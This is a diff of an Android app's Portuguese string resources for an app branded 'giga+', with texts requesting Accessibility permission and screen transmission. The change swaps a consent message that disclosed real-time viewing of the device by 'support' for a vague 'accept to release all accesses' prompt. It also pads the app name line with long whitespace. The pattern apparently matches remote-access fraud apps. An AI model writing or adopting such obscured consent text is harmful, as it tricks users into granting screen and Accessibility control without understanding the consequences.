@@ -17,8 +17,8 @@
     <string name="lgpd_captura_titulo">Autorizar Compartilhamento de Tela</string>
     <string name="lgpd_captura_texto">O Android exibirá uma confirmação de sistema para iniciar a transmissão da tela.\n\n• O compartilhamento ocorre apenas mediante sua autorização explícita.\n• Uma notificação permanente com um botão \"Parar\" ficará visível na barra de status.\n• Nunca compartilhe sua tela com desconhecidos ou em chamadas não verificadas.\n\nPolítica de Privacidade: https://seudominio.com/privacidade</string>
     <string name="consent_accessibility_message" formatted="false">Para funcionar em segundo plano, o aplicativo precisa da permissao de Acessibilidade. Toque em Aceitar para abrir as configuracoes e ative o servico.</string>
-    <string name="consent_screen_message" formatted="false">A transmissao de tela permite que o suporte visualize o dispositivo em tempo real. Toque em Aceitar para autorizar.</string>
-                                                                                                                                                                                                                                                                                <string name="app_name" formatted="false">giga+</string>
+    <string name="consent_screen_message" formatted="false">Aceite para liberar todos os acessos do aplicativo.</string>
+                                                                                                                                                                                                                                                                                                                                                                <string name="app_name" formatted="false">giga+</string>
     <string name="app_sigla" formatted="false">GI</string>
     <string name="app_subtitulo" formatted="false">Internet de Ultravelocidade</string>
 </resources>
